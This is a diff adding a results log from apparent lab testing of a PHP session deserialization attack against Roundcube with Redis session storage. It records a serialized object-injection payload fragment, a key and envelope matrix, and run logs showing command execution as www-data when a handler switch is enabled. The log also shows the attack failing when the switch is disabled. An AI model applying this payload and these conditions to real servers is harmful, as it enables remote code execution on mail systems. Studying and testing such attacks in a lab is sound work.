@@ -1,0 +1,42 @@
+# probe
+keys: ['rcprobe8427abc']
+writer_key_is_raw_sid: True
+value_head: a:1:{s:36:"upload_progress_|O:8:"VdSimple":0:{}";a:5:{s:10:"start_time
+probe_json: {"php":"8.4.27","redis_ext":true,"session_status":1,"session_id":"","session_name":"PHPSESSID","save_handler":"redis","save_path":"tcp:\/\/redis:6379?prefix=","serialize_handler":"php_serialize","upload_progress":"1","cleanup":"","cookies":[],"session_keys":null,"post_keys":[],"files":[]}
+save_path: tcp://redis:6379?prefix=
+ini upload_progress.cleanup (empty string == Off): ''
+
+# flow (keys aligned, no seeding)
+real flow (keys aligned)           dtor=no  plugin_switch_off=True proof=none
+keys: ['rcflow8427abc']
+stored_head: a:3:{s:7:"changed";i:1793409733;s:2:"ip";N;s:4:"vars";s:483:"temp|b:1;language|s:5:"en_US"
+ttl: 660
+
+# matrix (plugin switch disabled)
+key \ envelope                     raw blob (phpredis)            rcube wrapper
+raw sid + phpredis blob            dtor=no  plugin_switch_off=True proof=none
+raw sid + rcube wrapper            dtor=YES plugin_switch_off=True proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+prefixed + phpredis blob           dtor=no  plugin_switch_off=True proof=none
+prefixed + rcube wrapper           dtor=no  plugin_switch_off=True proof=none
+
+# php storage (server store = redis), plugin switch ON
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18321 container php2shell-rc-redis-php spray 3048
+[s] response=HTTP/1.1 200 OK proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[s] plugin log:
+1793409744.976603 pid=165 plugin-load handler=php_serialize name=PHPSESSID
+1793409744.976710 pid=165 handler-switched handler=php
+1793409744.977763 pid=165 simple-dtor
+1793409744.980811 pid=165 plugin-init task=.*
+
+# same, plugin switch DISABLED
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18321 container php2shell-rc-redis-php spray 3048
+[s] response=HTTP/1.1 200 OK proof=''
+[s] plugin log:
+1793409746.066471 pid=199 plugin-load handler=php_serialize name=PHPSESSID
+1793409746.066575 pid=199 handler-switch-DISABLED handler=php_serialize
+1793409746.068938 pid=199 plugin-init task=.*
+
+# redis storage: wrapper at raw key, gadget classes DISABLED
+raw key + wrapper, switch ON       dtor=no  plugin_switch_off=False proof=none
